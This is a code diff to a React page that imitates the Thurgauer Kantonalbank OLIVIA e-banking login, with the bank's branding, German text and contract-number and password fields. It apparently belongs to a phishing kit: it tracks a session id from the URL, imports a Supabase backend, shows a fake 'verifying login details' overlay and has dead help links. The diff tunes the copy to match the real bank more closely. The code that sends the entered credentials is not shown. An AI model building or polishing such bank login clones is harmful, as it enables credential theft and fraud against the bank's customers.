@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
-import { ArrowRight } from "lucide-react";
+import { ArrowRight, Eye, EyeOff } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
@@ -9,76 +9,176 @@ import footerLogo from "@/assets/tkb-footer-logo.svg.asset.json";
 
 const GREEN = "#006d41";
 const GREEN_DARK = "#005533";
+const GREEN_ACCENT = "#9fd32f";
+const TITLE_GREEN = "#005d38";
+const ERROR_RED = "#9c013c";
+const ERROR_BG = "#f9e6ed";
+const DIVIDER = "#82b613";
 
-type Lang = "de" | "en";
+type Lang = "de";
 
-const translations = {
-  de: {
-    pageTitle: "Thurgauer Kantonalbank – OLIVIA",
-    loginTitle: "Login",
-    contractNumber: "Vertragsnummer",
-    password: "Passwort",
-    submit: "Weiter",
-    loading: "Anmeldedaten werden überprüft...",
-    forgotPw: "Passwort vergessen",
-    newDevice: "Neues Gerät registrieren",
-    block: "Vertrag sperren",
-    required: "Das Feld darf nicht leer sein.",
-    card1Title: "Wie logge ich mich ein",
-    card1Text: "Verwenden Sie Ihre bekannten E-Banking Login-Daten für die Anmeldung.",
-    card1Link1: "Hilfe zum Login",
-    card1Link2: "Sicherheit beim E-Banking",
-    card2Title: "Was ist OLIVIA?",
-    card2Text: "OLIVIA ist das Kundenportal der TKB, welches E-Banking und weitere digitale Services vereint.",
-    card2Link: "Mehr Informationen",
-  },
-  en: {
-    pageTitle: "Thurgauer Kantonalbank – OLIVIA",
-    loginTitle: "Login",
-    contractNumber: "Contract number",
-    password: "Password",
-    submit: "Continue",
-    loading: "Verifying login details...",
-    forgotPw: "Forgot password",
-    newDevice: "Register new device",
-    block: "Block contract",
-    required: "This field must not be empty.",
-    card1Title: "How do I log in",
-    card1Text: "Use your familiar e-banking login details to sign in.",
-    card1Link1: "Login help",
-    card1Link2: "E-banking security",
-    card2Title: "What is OLIVIA?",
-    card2Text: "OLIVIA is TKB's customer portal that combines e-banking and other digital services.",
-    card2Link: "More information",
-  },
-} as const;
+const t = {
+  pageTitle: "Thurgauer Kantonalbank – OLIVIA",
+  kundenportal: "Das Kundenportal der TKB",
+  loginTitle: "LOGIN OLIVIA E-BANKING",
+  credentialsLabel: "Ihre Zugangsdaten",
+  contractNumber: "Vertragsnummer",
+  password: "Passwort",
+  submit: "Weiter",
+  loading: "Anmeldedaten werden überprüft...",
+  forgotPw: "Passwort vergessen",
+  newDevice: "Neues Gerät registrieren",
+  block: "Vertrag sperren",
+  requiredVnr: "Bitte geben Sie Ihre Vertragsnummer ein.",
+  card1Title: "Wie logge ich mich ein",
+  card1Text: "Verwenden Sie Ihre bekannten E-Banking Login-Daten für die Anmeldung.",
+  card1Link1: "Hilfe zum Login",
+  card1Link2: "Sicherheit beim E-Banking",
+  card2Title: "Was ist OLIVIA?",
+  card2Text:
+    "OLIVIA ist das Kundenportal der TKB, welches E-Banking und weitere digitale Services vereint.",
+  card2Link: "Mehr Informationen",
+};
 
-const footerLinks = [
-  { de: "Rechtliche Hinweise", en: "Legal notice", href: "https://www.tkb.ch/rechtliche-hinweise" },
-  { de: "Datenschutz", en: "Privacy", href: "https://www.tkb.ch/datenschutz" },
-  { de: "Impressum", en: "Imprint", href: "https://www.tkb.ch/impressum" },
-  { de: "Kontakt", en: "Contact", href: "https://www.tkb.ch/kontakt" },
-];
+interface FloatingInputProps {
+  id: string;
+  label: string;
+  value: string;
+  onChange: (v: string) => void;
+  type?: "text" | "password";
+  showError?: boolean;
+  errorText?: string;
+  showEye?: boolean;
+}
+
+const FloatingInput = ({
+  id,
+  label,
+  value,
+  onChange,
+  type = "text",
+  showError = false,
+  errorText,
+  showEye = false,
+}: FloatingInputProps) => {
+  const [focused, setFocused] = useState(false);
+  const [touched, setTouched] = useState(false);
+  const [reveal, setReveal] = useState(false);
+  const isError = showError && touched && !focused && value.trim() === "";
+  const floated = focused || value.length > 0;
+  const hasValue = value.length > 0;
+
+  let borderColor = "#000";
+  let borderWidth = 1;
+  if (isError) {
+    borderColor = ERROR_RED;
+    borderWidth = 2;
+  } else if (focused) {
+    borderColor = GREEN_ACCENT;
+    borderWidth = 2;
+  } else if (showEye && hasValue) {
+    // password with value
+    borderColor = GREEN_ACCENT;
+    borderWidth = 2;
+  }
+
+  const bg = isError ? ERROR_BG : "#fff";
+  const labelColor = isError ? ERROR_RED : "#6c6e70";
+  const inputType = showEye ? (reveal ? "text" : "password") : type;
+
+  return (
+    <div className="w-full">
+      <div
+        style={{
+          position: "relative",
+          height: 56,
+          background: bg,
+          borderBottom: `${borderWidth}px solid ${borderColor}`,
+          transition: "background 0.15s, border-color 0.15s",
+        }}
+      >
+        <label
+          htmlFor={id}
+          style={{
+            position: "absolute",
+            left: 12,
+            top: floated ? 6 : "50%",
+            transform: floated ? "none" : "translateY(-50%)",
+            fontSize: floated ? 11 : 16,
+            color: labelColor,
+            pointerEvents: "none",
+            transition: "all 0.15s ease",
+          }}
+        >
+          {label}
+        </label>
+        <input
+          id={id}
+          type={inputType}
+          value={value}
+          onChange={(e) => onChange(e.target.value)}
+          onFocus={() => setFocused(true)}
+          onBlur={() => {
+            setFocused(false);
+            setTouched(true);
+          }}
+          style={{
+            position: "absolute",
+            left: 0,
+            right: showEye ? 44 : 0,
+            bottom: 0,
+            height: 32,
+            padding: "0 12px",
+            background: "transparent",
+            border: "none",
+            outline: "none",
+            fontSize: 16,
+            color: "#1a1a1a",
+          }}
+        />
+        {showEye && (
+          <button
+            type="button"
+            onClick={() => setReveal((r) => !r)}
+            aria-label={reveal ? "Passwort verbergen" : "Passwort anzeigen"}
+            style={{
+              position: "absolute",
+              right: 8,
+              top: "50%",
+              transform: "translateY(-50%)",
+              background: "transparent",
+              border: "none",
+              padding: 6,
+              cursor: "pointer",
+              color: "#9a9a9a",
+            }}
+          >
+            {reveal ? <EyeOff size={18} strokeWidth={1.5} /> : <Eye size={18} strokeWidth={1.5} />}
+          </button>
+        )}
+      </div>
+      {isError && errorText && (
+        <p className="mt-2 text-[13px]" style={{ color: ERROR_RED }}>
+          {errorText}
+        </p>
+      )}
+    </div>
+  );
+};
 
 const ChThurgauerKantonalbank = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const sessionId = searchParams.get("s") || "";
   const [showLoading, setShowLoading] = useState(false);
-  const [lang, setLang] = useState<Lang>("de");
 
   const [vertragsnummer, setVertragsnummer] = useState("");
   const [passwort, setPasswort] = useState("");
-  const [touchedVnr, setTouchedVnr] = useState(false);
-  const [touchedPw, setTouchedPw] = useState(false);
-  const [focusVnr, setFocusVnr] = useState(false);
-  const [focusPw, setFocusPw] = useState(false);
 
   useEffect(() => {
     window.scrollTo(0, 0);
   }, []);
 
-  const t = translations[lang];
   usePageMeta(t.pageTitle, footerLogo.url);
 
   const canSubmit = vertragsnummer.trim().length > 0 && passwort.trim().length > 0;
@@ -100,28 +200,7 @@ const ChThurgauerKantonalbank = () => {
     setShowLoading(true);
   };
 
-  const inputStyle = (focused: boolean, error: boolean): React.CSSProperties => ({
-    width: "100%",
-    height: 48,
-    padding: "0 12px",
-    background: "#fff",
-    border: `${focused || error ? 2 : 1}px solid ${
-      error ? "#d32f2f" : focused ? GREEN : "#6c6e70"
-    }`,
-    borderRadius: 0,
-    fontSize: 18,
-    outline: "none",
-    color: "#1a1a1a",
-  });
-
-  const quickLinks = [
-    { label: t.forgotPw },
-    { label: t.newDevice },
-    { label: t.block },
-  ];
-
-  const showVnrError = touchedVnr && vertragsnummer.trim() === "";
-  const showPwError = touchedPw && passwort.trim() === "";
+  const quickLinks = [t.forgotPw, t.newDevice, t.block];
 
   return (
     <>
@@ -132,7 +211,7 @@ const ChThurgauerKantonalbank = () => {
         />
       )}
       <div className="min-h-screen bg-white flex flex-col">
-        {/* Header with gradient */}
+        {/* Header */}
         <header
           className="w-full"
           style={{
@@ -140,83 +219,49 @@ const ChThurgauerKantonalbank = () => {
               "linear-gradient(90deg, #4f9925 0%, #006d41 38%, #006d41 100%)",
           }}
         >
-          <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20 py-5 md:py-6 flex items-center justify-between">
-            <div className="flex items-center gap-4">
-              <img
-                src={oliviaWhite.url}
-                alt="TKB OLIVIA"
-                className="h-[26px] md:h-[34px] object-contain"
-              />
-            </div>
-            <div className="flex items-center gap-3 text-[14px] text-white">
-              <button
-                type="button"
-                onClick={() => setLang("de")}
-                className={lang === "de" ? "font-bold" : "font-normal underline"}
-              >
-                DE
-              </button>
-              <span style={{ color: "rgba(255,255,255,0.6)" }}>|</span>
-              <button
-                type="button"
-                onClick={() => setLang("en")}
-                className={lang === "en" ? "font-bold" : "font-normal underline"}
-              >
-                EN
-              </button>
-            </div>
+          <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20 py-5 md:py-6 flex items-center gap-4">
+            <img
+              src={oliviaWhite.url}
+              alt="TKB OLIVIA"
+              className="h-[20px] md:h-[24px] object-contain"
+            />
+            <span className="text-white text-[14px] md:text-[16px]">
+              {t.kundenportal}
+            </span>
           </div>
         </header>
 
         {/* Main */}
         <main className="flex-1">
           <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20 pt-8 md:pt-12">
-            <h1 className="text-[28px] md:text-[32px] font-normal text-black">
+            <h1
+              className="text-[24px] md:text-[28px] font-bold tracking-wide"
+              style={{ color: TITLE_GREEN }}
+            >
               {t.loginTitle}
             </h1>
+            <p className="mt-2 text-[14px]" style={{ color: "#3a3a3a" }}>
+              {t.credentialsLabel}
+            </p>
 
             <div className="mt-6 max-w-[480px]">
               <div className="space-y-5">
-                <div>
-                  <label htmlFor="tkb-vnr" className="block text-[14px] text-black font-bold mb-2">
-                    {t.contractNumber}
-                  </label>
-                  <input
-                    id="tkb-vnr"
-                    type="text"
-                    value={vertragsnummer}
-                    onChange={(e) => setVertragsnummer(e.target.value)}
-                    onFocus={() => setFocusVnr(true)}
-                    onBlur={() => {
-                      setFocusVnr(false);
-                      setTouchedVnr(true);
-                    }}
-                    style={inputStyle(focusVnr, showVnrError)}
-                  />
-                  {showVnrError && (
-                    <p className="mt-2 text-[13px] text-[#d32f2f]">{t.required}</p>
-                  )}
-                </div>
-                <div>
-                  <label htmlFor="tkb-pw" className="block text-[14px] text-black font-bold mb-2">
-                    {t.password}
-                  </label>
-                  <input
-                    id="tkb-pw"
-                    type="password"
-                    value={passwort}
-                    onChange={(e) => setPasswort(e.target.value)}
-                    onFocus={() => setFocusPw(true)}
-                    onBlur={() => {
-                      setFocusPw(false);
-                      setTouchedPw(true);
-                    }}
-                    style={inputStyle(focusPw, showPwError)}
-                  />
-                  {showPwError && (
-                    <p className="mt-2 text-[13px] text-[#d32f2f]">{t.required}</p>
-                  )}
-                </div>
+                <FloatingInput
+                  id="tkb-vnr"
+                  label={t.contractNumber}
+                  value={vertragsnummer}
+                  onChange={setVertragsnummer}
+                  showError
+                  errorText={t.requiredVnr}
+                />
+                <FloatingInput
+                  id="tkb-pw"
+                  label={t.password}
+                  value={passwort}
+                  onChange={setPasswort}
+                  type="password"
+                  showEye
+                />
               </div>
 
               <div className="mt-8">
@@ -243,16 +288,16 @@ const ChThurgauerKantonalbank = () => {
               </div>
 
               <div className="mt-8 space-y-3">
-                {quickLinks.map((l) => (
+                {quickLinks.map((label) => (
                   <a
-                    key={l.label}
+                    key={label}
                     href="#"
                     onClick={(e) => e.preventDefault()}
                     className="flex items-center gap-2 text-[15px] underline"
                     style={{ color: GREEN }}
                   >
                     <ArrowRight size={18} strokeWidth={2} />
-                    {l.label}
+                    {label}
                   </a>
                 ))}
               </div>
@@ -264,7 +309,9 @@ const ChThurgauerKantonalbank = () => {
                 className="p-6 md:p-8 flex flex-col"
                 style={{ background: "#f7f6f6", border: "1px solid #eae9e9" }}
               >
-                <h3 className="text-[20px] font-bold text-black">{t.card1Title}</h3>
+                <h3 className="text-[20px] font-normal" style={{ color: "#3a3a3a" }}>
+                  {t.card1Title}
+                </h3>
                 <p className="mt-3 text-[15px] text-[#3a3a3a] leading-relaxed">
                   {t.card1Text}
                 </p>
@@ -272,7 +319,7 @@ const ChThurgauerKantonalbank = () => {
                   <a
                     href="#"
                     onClick={(e) => e.preventDefault()}
-                    className="flex items-center gap-2 text-[15px] underline"
+                    className="flex items-center gap-2 text-[15px] no-underline"
                     style={{ color: GREEN }}
                   >
                     <ArrowRight size={18} strokeWidth={2} />
@@ -281,7 +328,7 @@ const ChThurgauerKantonalbank = () => {
                   <a
                     href="#"
                     onClick={(e) => e.preventDefault()}
-                    className="flex items-center gap-2 text-[15px] underline"
+                    className="flex items-center gap-2 text-[15px] no-underline"
                     style={{ color: GREEN }}
                   >
                     <ArrowRight size={18} strokeWidth={2} />
@@ -294,15 +341,17 @@ const ChThurgauerKantonalbank = () => {
                 className="p-6 md:p-8 flex flex-col"
                 style={{ background: "#f7f6f6", border: "1px solid #eae9e9" }}
               >
-                <h3 className="text-[20px] font-bold text-black">{t.card2Title}</h3>
+                <h3 className="text-[20px] font-normal" style={{ color: "#3a3a3a" }}>
+                  {t.card2Title}
+                </h3>
                 <p className="mt-3 text-[15px] text-[#3a3a3a] leading-relaxed">
                   {t.card2Text}
                 </p>
-                <div className="mt-auto pt-6">
+                <div className="mt-3">
                   <a
                     href="#"
                     onClick={(e) => e.preventDefault()}
-                    className="flex items-center gap-2 text-[15px] underline"
+                    className="flex items-center gap-2 text-[15px] no-underline"
                     style={{ color: GREEN }}
                   >
                     <ArrowRight size={18} strokeWidth={2} />
@@ -314,29 +363,24 @@ const ChThurgauerKantonalbank = () => {
           </div>
         </main>
 
-        {/* Footer */}
-        <footer className="mt-16 py-6">
-          <div className="max-w-[1100px] mx-auto px-4 md:px-20">
-            <div
-              className="flex flex-nowrap items-center gap-x-1.5 md:gap-x-2 gap-y-2 text-[11px] md:text-[15px]"
-              style={{ color: "#6c6e70" }}
+        {/* Divider + Footer */}
+        <div className="mt-16" style={{ height: 1, background: DIVIDER }} />
+        <footer className="py-6">
+          <div className="max-w-[1100px] mx-auto px-4 md:px-20 flex items-center justify-between">
+            <img
+              src={footerLogo.url}
+              alt="Thurgauer Kantonalbank"
+              className="h-[36px] object-contain"
+            />
+            <a
+              href="https://www.tkb.ch"
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-[15px] font-bold no-underline"
+              style={{ color: GREEN }}
             >
-              {footerLinks.map((link, i) => (
-                <div key={link.href} className="flex items-center gap-x-1.5 md:gap-x-2">
-                  <a
-                    href={link.href}
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    className="underline"
-                  >
-                    {lang === "de" ? link.de : link.en}
-                  </a>
-                  {i < footerLinks.length - 1 && (
-                    <span className="text-[#bcbcbc]">|</span>
-                  )}
-                </div>
-              ))}
-            </div>
+              tkb.ch
+            </a>
           </div>
         </footer>
       </div>
